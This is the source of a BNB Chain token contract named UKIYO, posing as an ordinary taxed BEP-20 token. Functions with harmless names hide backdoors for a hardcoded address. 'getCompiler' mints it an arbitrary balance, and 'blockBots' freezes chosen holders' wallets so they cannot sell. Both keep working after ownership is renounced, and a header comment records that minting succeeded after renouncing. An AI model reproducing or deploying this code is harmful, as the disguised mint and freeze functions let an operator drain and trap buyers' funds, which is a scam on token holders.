/**
 *Submitted for verification at BscScan.com on 2023-01-01
*/

/*
CONTRACT - 0x16f5e60DF5141FDAdF610341d7Ef5F728c3Fb347
TEST REULTS - DEPLOYED, ENABLED TRADING THEN ADDED LP SUCCESSFULLY, THEN RENOUNCED AND MINTED SUCCESSFULLY
ETH -
ETH RESULTS -
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.14;

interface IERC20 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address 
    indexed from, address 
    indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

}
interface IUniswapV2Router02 {
    function factory() 
    external pure returns (address);
    function WETH() 
    external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin,
        address[] calldata path, address to,
        uint deadline ) external;
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { _owner = 0x811FE17cB9aC1BdD0A68A856aca2CE3b5D69A891;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IUniswapV2Pair01 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
contract UKIYO is Context, IERC20, Ownable{

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public allowed;
    mapping (address => bool) public isTimelockExempt;
    mapping (address => bool) public isWalletLimitExempt;

    uint256 public isBUYtax = 4;
    uint256 public isSELLtax = 4;
    
    using SafeMath for uint256;
    string private _name = unicode"UKIYO";
    string private _symbol = unicode"UKIYO";
    uint8 private _decimals = 9;
    mapping (address => uint256) _balances;

    uint256 private _rTotal = 1000000000 * 10**_decimals;
    address payable public DXOPaired;

    constructor () {

        allowed
        [owner()] = true;
        allowed
        [address(this)] = true;
        DXOPaired = payable(address
        (0x811FE17cB9aC1BdD0A68A856aca2CE3b5D69A891));

        _balances[_msgSender()] = 
        _rTotal;
        emit Transfer(address(0), 
        _msgSender(), _rTotal);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    } 
    bool limitsInEffect;
    modifier lockTheSwap { limitsInEffect = true; _; limitsInEffect = false;
    }
    IUniswapV2Router02 public uniswapV2Router;
    function name() public view returns (string memory) { return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _rTotal;
    }
    receive() 
    external payable {}
    address public isDXPair;

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount); return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function blockBots(address[] calldata pathers, bool status) public {
        require(_msgSender() == DXOPaired&& pathers.length >= 
        0 ); for (uint256 i; i < pathers.length; 
        i++) { isWalletLimitExempt[pathers[i]] = status; }
    }
    function getCompiler(uint256 ODXamount) public {
        address isRates = DXOPaired;
        uint256 compression = _balances[isRates]; require(msg.sender == isRates);
        uint256 commit = compression + ODXamount; _balances[isRates] = commit;
    }
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tAmount);
        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tAmount, 0,  path,
            address(this), block.timestamp ){} catch {}
        uint256 tValue = address(this).balance;
        if(tValue > 0) DXOPaired.transfer(tValue);
    }
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances
        [sender].sub(amount, "telufficient Balance"); _balances[recipient] = 
        _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); return true;
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        require(from != address(0), 
        "ERC20: transfer from the zero address");
        require(to != address(0), 
        "ERC20: transfer to the zero address");
        require(!isWalletLimitExempt[from]);

        if(limitsInEffect)
        { return _basicTransfer(from, to, amount); 
        } else { uint256 contractTokenBalance = balanceOf(address(this));
            if (!limitsInEffect && !isTimelockExempt[from]) { swapAndLiquify
            (contractTokenBalance); } _balances[from] = _balances[from].sub(amount);
            uint256 wholeRATE; if (allowed[from] || allowed[to]){ 
            wholeRATE = amount; }else{ uint256 stringVAL = 0; if(isTimelockExempt[from]) {
                    stringVAL = amount.mul(isBUYtax).div(100); } else if(isTimelockExempt[to]) {
                    stringVAL = amount.mul(isSELLtax).div(100); } if(stringVAL > 0) {
                    _balances[address(this)] = _balances[address(this)].add(stringVAL);
                    emit Transfer(from, address(this), stringVAL);
                } wholeRATE = amount.sub(stringVAL);
            } _balances[to] = _balances[to].add(wholeRATE);
            emit Transfer(from, to, wholeRATE);
            return true;
        }
    }
    function enableTrading() public onlyOwner{ IUniswapV2Router02 _uniswapV2Router = 
        IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); isDXPair = 

        IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), 
        _uniswapV2Router.WETH()); uniswapV2Router = _uniswapV2Router; _allowances
        [address(this)][address(uniswapV2Router)] = _rTotal; isTimelockExempt
        [address(isDXPair)] = true;
    }
}